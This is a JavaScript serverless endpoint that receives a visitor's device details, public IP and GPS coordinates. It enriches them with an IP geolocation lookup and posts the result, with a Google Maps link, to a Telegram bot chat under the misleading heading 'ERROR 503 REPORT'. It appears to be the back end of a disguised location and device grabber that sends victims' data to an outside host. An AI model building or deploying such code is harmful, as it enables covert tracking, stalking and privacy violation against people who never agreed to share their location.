export const config = {
  runtime: "nodejs18.x"
};

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID  = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ error: "ENV belum diset" });
  }

  const input = req.body || {};

  const ip =
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    "Unknown";

  const time = new Date().toLocaleString("id-ID");

  let ipinfo = {};
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`);
    ipinfo = await r.json();
  } catch {}

  // 🔒 AMAN: TANPA MARKDOWN
  const message = `
ERROR 503 REPORT

DEVICE INFO
OS: ${input.os || "-"}
Platform: ${input.platform || "-"}
CPU: ${input.cpu || "-"}
RAM: ${input.ram || "-"}
Resolution: ${input.resolution || "-"}
Browser: ${input.browser || "-"}

Timezone: ${input.timezone || "-"}
Language: ${input.language || "-"}
Public IP: ${ip}

IP INFO
Country: ${ipinfo.country_name || "-"}
Region: ${ipinfo.region || "-"}
City: ${ipinfo.city || "-"}
ISP: ${ipinfo.org || "-"}

LOCATION
Lat: ${input.latitude || "-"}
Lon: ${input.longitude || "-"}
Accuracy: ${input.accuracy || "-"}

Maps:
https://www.google.com/maps?q=${input.latitude},${input.longitude}

Time: ${time}
`;

  try {
    const tg = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }
    );

    const result = await tg.json();

    if (!result.ok) {
      return res.status(500).json({
        error: "Telegram reject",
        detail: result
      });
    }

    return res.status(200).json({ success: true });
  } catch (e) {
    return res.status(500).json({ error: "Fetch gagal" });
  }
}
